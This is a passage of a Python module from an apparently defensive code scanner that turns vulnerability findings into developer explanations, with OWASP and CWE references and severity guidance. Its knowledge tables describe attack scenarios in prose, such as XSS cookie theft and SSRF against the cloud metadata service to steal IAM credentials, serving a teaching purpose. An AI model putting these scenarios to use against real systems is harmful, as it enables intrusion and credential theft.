        "common_mistakes": "Stripping ../ only once, checking before canonicalization, using user input directly in file paths.",
    },
    "xss": {
        "why_dangerous": "Cross-site scripting lets attackers inject scripts into pages viewed by other users, stealing sessions and data.",
        "real_world_exploit": "Attacker injects <script> tags through input fields that are rendered without encoding, stealing session cookies.",
        "attacker_scenario": "Attacker crafts XSS payload, distributes via phishing or stored content, steals cookies/credentials of victims.",
        "secure_fix": "Use context-aware output encoding. Enable framework auto-escaping. Use CSP headers. Sanitize HTML with DOMPurify.",
        "common_mistakes": "Using innerHTML, dangerouslySetInnerHTML, disabling template auto-escaping, incomplete encoding.",
    },
    "ssrf": {
        "why_dangerous": "SSRF allows attackers to make the server request internal resources, cloud metadata, and other services.",
        "real_world_exploit": "Attacker uses SSRF to access cloud metadata service (169.254.169.254) and steal IAM credentials.",
        "attacker_scenario": "Attacker finds URL fetch endpoint, targets internal services, extracts cloud credentials, pivots to cloud resources.",
        "secure_fix": "Validate URLs against allowlist of domains. Block private IP ranges. Disable redirects. Use egress proxy.",
        "common_mistakes": "Blocking only 127.0.0.1, allowing redirects, not blocking IPv6, DNS rebinding.",
    },
    "secrets": {
        "why_dangerous": "Exposed secrets grant immediate unauthorized access to systems, APIs, databases, and cloud infrastructure.",
        "real_world_exploit": "Leaked AWS keys on GitHub are scraped by bots within minutes, used for crypto-mining and data theft.",
        "attacker_scenario": "Attacker scans repos/logs for secrets, uses found credentials to access production systems.",
        "secure_fix": "Use environment variables or secret managers. Never commit secrets to source control. Rotate exposed keys immediately.",
        "common_mistakes": "Committing .env files, hardcoding in Docker args, logging secrets, default passwords in production.",
    },
    "devops": {
        "why_dangerous": "CI/CD and infrastructure misconfigurations can expose the entire software supply chain to compromise.",
        "real_world_exploit": "Overly permissive GitHub Actions workflow allows PRs from forks to access repository secrets.",
        "attacker_scenario": "Attacker targets CI/CD pipelines to inject malicious code, steal secrets, or compromise build artifacts.",
        "secure_fix": "Follow least privilege for CI/CD. Pin action versions. Use OIDC for cloud auth. Restrict secret access.",
        "common_mistakes": "Wildcarded permissions, unpinned actions, secrets in logs, over-privileged service accounts.",
    },
}


# =====================================================================
#  OWASP Top 10 2021 Mapping
# =====================================================================

_OWASP_REFERENCES: Dict[str, Dict[str, str]] = {
    "A01": {"name": "Broken Access Control", "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"},
    "A02": {"name": "Cryptographic Failures", "url": "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"},
    "A03": {"name": "Injection", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
    "A04": {"name": "Insecure Design", "url": "https://owasp.org/Top10/A04_2021-Insecure_Design/"},
    "A05": {"name": "Security Misconfiguration", "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"},
    "A06": {"name": "Vulnerable and Outdated Components", "url": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"},
    "A07": {"name": "Identification and Authentication Failures", "url": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"},
    "A08": {"name": "Software and Data Integrity Failures", "url": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"},
    "A09": {"name": "Security Logging and Monitoring Failures", "url": "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"},
    "A10": {"name": "Server-Side Request Forgery", "url": "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery/"},
}


# =====================================================================
#  Public API
# =====================================================================


def generate_developer_explanation(finding: dict) -> DeveloperExplanation:
    """Generate a structured developer explanation for a vulnerability finding.

    Args:
        finding: EngineFinding dict (or EngineFinding.__dict__).

    Returns:
        DeveloperExplanation dict with all explanation fields.
    """
    cwe = str(finding.get("cwe", ""))
    category = str(finding.get("category", "")).lower()
    vuln_type = str(finding.get("vulnerability_type", ""))
    rule_id = str(finding.get("rule_id", ""))
    severity = str(finding.get("severity", "medium")).lower()
    description = str(finding.get("description", ""))
    impact = str(finding.get("impact", ""))
    remediation = str(finding.get("remediation", ""))
    code_snippet = str(finding.get("code_snippet", ""))

    # ── Look up CWE-specific knowledge ──────────────────────────────
    cwe_key = cwe.split(":")[0].strip() if cwe else ""  # "CWE-89" from "CWE-89: SQL Injection"
    cwe_data = _CWE_KNOWLEDGE.get(cwe_key, {})

    # ── Fall back to category-level knowledge ───────────────────────
    cat_data = _CATEGORY_FALLBACK.get(category, _CATEGORY_FALLBACK.get("injection", {}))

    # ── Build explanation ───────────────────────────────────────────
    why_dangerous = cwe_data.get("why_dangerous") or cat_data.get("why_dangerous", description)
    real_world = cwe_data.get("real_world_exploit") or cat_data.get("real_world_exploit", "")
    attacker = cwe_data.get("attacker_scenario") or cat_data.get("attacker_scenario", "")
    fix = cwe_data.get("secure_fix") or remediation or cat_data.get("secure_fix", "")
    code_example = cwe_data.get("secure_code_python", "")
    mistakes = cwe_data.get("common_mistakes") or cat_data.get("common_mistakes", "")

    # ── Build references ────────────────────────────────────────────
    references: List[Dict[str, str]] = []

    # OWASP reference
    owasp = str(finding.get("owasp", ""))
    owasp_key = owasp.split(":")[0].strip() if owasp else ""
    owasp_info = _OWASP_REFERENCES.get(owasp_key, {})
    if owasp_info:
        references.append({
            "source": "OWASP Top 10 2021",
            "name": owasp_info["name"],
            "url": owasp_info["url"],
        })

    # CWE reference
    if cwe_key:
        cwe_num = cwe_key.replace("CWE-", "")
        references.append({
            "source": "CWE",
            "name": cwe_key,
            "url": f"https://cwe.mitre.org/data/definitions/{cwe_num}.html",
        })

    # Severity-specific guidance
    severity_guidance = _severity_guidance(severity)

    return {
        "rule_id": rule_id,
        "vulnerability_type": vuln_type,
        "severity": severity,
        "why_this_is_dangerous": why_dangerous,
        "real_world_exploit": real_world,
        "attacker_abuse_scenario": attacker,
        "secure_fix": fix,
        "secure_code_example": code_example,
        "common_mistakes": mistakes,
        "references": references,
        "severity_guidance": severity_guidance,
        "detection_layer_info": _detection_layer_info(finding),
    }


def generate_batch_explanations(
    findings: list,
) -> List[DeveloperExplanation]:
    """Generate explanations for a batch of findings.

    Args:
        findings: List of EngineFinding dicts.

    Returns:
        List of DeveloperExplanation dicts (same order as input).
    """
    return [generate_developer_explanation(f) for f in findings]


def _severity_guidance(severity: str) -> str:
    """Map severity to prioritization guidance."""
    guidance = {
        "critical": (
            "IMMEDIATE ACTION REQUIRED. This vulnerability can be "
            "exploited remotely with minimal effort, typically leading "
            "to full system compromise. Fix before next deployment."
        ),
        "high": (
            "HIGH PRIORITY. This vulnerability poses significant risk "
            "and should be fixed in the current sprint. Attackers with "
            "moderate skill can exploit this."
        ),
        "medium": (
            "SHOULD FIX. This vulnerability requires specific conditions "
            "to exploit but still poses real risk. Schedule for fixing "
            "within the next 2-4 weeks."
        ),
        "low": (
            "MONITOR. This is a defense-in-depth concern or requires "
            "uncommon conditions to exploit. Fix when convenient, but "
            "track for compliance."
        ),
        "info": (
            "INFORMATIONAL. Best practice recommendation. Not directly "
            "exploitable but indicates code quality or security hygiene "
            "issues that may compound over time."
        ),
    }
    return guidance.get(severity, guidance["medium"])


def _detection_layer_info(finding: dict) -> str:
    """Describe how the vulnerability was detected."""
    rule_id = str(finding.get("rule_id", ""))

    if rule_id.startswith("LOGIC-"):
        return (
            "Layer 3: Advanced Logic Detection. This finding was "
            "identified by analyzing code behavior patterns across "
            "multiple lines and functions — not just pattern matching."
        )

    if rule_id.startswith("CHAIN-"):
        return (
            "Layer 3: Exploit Chain Detection. This finding represents "
            "a chain of individually lower-risk vulnerabilities that "
            "together create a high-severity attack path."
        )

    detection_layer = finding.get("detection_layer", 1)
    try:
        detection_layer = int(detection_layer)
    except (TypeError, ValueError):
        detection_layer = 1
    if detection_layer >= 2:
        return (
            "Layer 2: Context-Aware Detection. This finding was "
            "identified using contextual analysis including taint "
            "tracking indicators and cross-function patterns."
        )

    return (
        "Layer 1: Pattern Detection. This finding was identified "
        "via direct regex pattern matching against known vulnerable "
        "code patterns."
    )
